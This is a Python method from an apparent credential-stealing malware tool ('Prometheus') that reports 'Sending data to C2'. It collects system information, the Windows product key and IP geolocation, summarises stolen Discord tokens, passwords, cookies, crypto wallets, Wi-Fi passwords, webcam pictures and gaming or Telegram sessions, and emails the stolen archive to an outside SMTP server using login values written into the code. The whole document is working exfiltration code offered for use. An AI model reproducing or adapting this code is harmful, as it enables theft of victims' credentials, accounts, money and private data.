def SendData(self) -> None: # Sends data to the mailtrap
        Logger.info("Sending data to C2")
        extention = self.CreateArchive()
        if not os.path.isfile(self.ArchivePath):
            raise FileNotFoundError("Failed to create archive")
        
        filename = "Prometheus-%s.%s" % (os.getlogin(), extention)

        computerName = os.getenv("computername") or "Unable to get computer name"
            
        computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()
        computerOS = computerOS[2].strip() if len(computerOS) >= 2 else "Unable to detect OS"

        totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()
        totalMemory = (str(int(int(totalMemory[1])/1000000000)) + " GB") if len(totalMemory) >= 1 else "Unable to detect total memory"

        uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()
        uuid = uuid[1].strip() if len(uuid) >= 1 else "Unable to detect UUID"

        cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip() or "Unable to detect CPU"

        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()
        gpu = gpu[2].strip() if len(gpu) >= 2 else "Unable to detect GPU"

        productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip() or "Unable to get product key"

        http = PoolManager(cert_reqs="CERT_NONE")

        try:
            r: dict = json.loads(http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode(errors= "ignore"))
            if r.get("status") != "success":
                raise Exception("Failed")
            data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
            if len(r["reverse"]) != 0:
                data += f"\nReverse DNS: {r['reverse']}"
        except Exception:
            ipinfo = "(Unable to get IP info)"
        else:
            ipinfo = data

        system_info = f"Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}"

        collection = {
            "Discord Accounts" : self.DiscordTokensCount,
            "Passwords" : self.PasswordsCount,
            "Cookies" : len(self.Cookies),
            "History" : self.HistoryCount,
            "Autofills" : self.AutofillCount,
            "Roblox Cookies" : self.RobloxCookiesCount,
            "Telegram Sessions" : self.TelegramSessionsCount,
            "Common Files" : self.CommonFilesCount,
            "Wallets" : self.WalletsCount,
            "Wifi Passwords" : self.WifiPasswordsCount,
            "Webcam" : self.WebcamPicturesCount,
            "Minecraft Sessions" : self.MinecraftSessions,
            "Epic Session" : "Yes" if self.EpicStolen else "No",
            "Steam Session" : "Yes" if self.SteamStolen else "No",
            "Uplay Session" : "Yes" if self.UplayStolen else "No",
            "Battle.Net Session" : "Yes" if self.BattleNetStolen else "No",
            "Growtopia Session" : "Yes" if self.GrowtopiaStolen else "No",
            "Screenshot" : "Yes" if self.ScreenshotTaken else "No",
            "System Info" : "Yes" if self.SystemInfoStolen else "No"
        }
        
        grabbedInfo = "\n".join([key + " : " + str(value) for key, value in collection.items()])

        # Email configuration
        sender_email = "your_email@example.com"
        receiver_email = "receiver_email@example.com"
        subject = "Data"
        body = f"System Info:\n{system_info}\n\nIP Info:\n{ipinfo}\n\nGrabbed Info:\n{grabbedInfo}"

        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = receiver_email
        message["Subject"] = subject

        message.attach(MIMEText(body, "plain"))

        with open(self.ArchivePath, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())

        encoders.encode_base64(part)

        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {filename}",
        )

        message.attach(part)

        text = message.as_string()

        # Connect to mailtrap SMTP server and send the email
        with smtplib.SMTP("sandbox.smtp.mailtrap.io", 2525) as server:
            server.login("1eeb44d334b89c", "d5da9bd3b22302")
            server.sendmail(sender_email, receiver_email, text)
